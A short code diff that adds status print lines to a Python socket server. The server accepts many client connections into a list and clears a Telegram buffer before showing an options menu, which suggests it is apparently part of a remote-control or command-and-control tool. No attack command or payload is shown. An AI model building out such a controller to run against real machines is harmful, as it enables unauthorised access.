@@ -22,12 +22,14 @@ serv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 
 # bind the socket
 def bind_sock():
+    print('[+] Binding socket')
     serv.bind((host, port))
     serv.listen()
 
 
 # constantly look for new connection with the help thearding
 def accept_conn():
+    print('[+] Accepting connections')
     while 1:
         client, addr = serv.accept()
         all_clients.append(client)
@@ -104,6 +106,7 @@ def main():
     clearTelegramBuffer = threading.Thread(target=tg.tfreshStart)
     clearTelegramBuffer.start()
     clearTelegramBuffer.join()
+
 
     options()
 
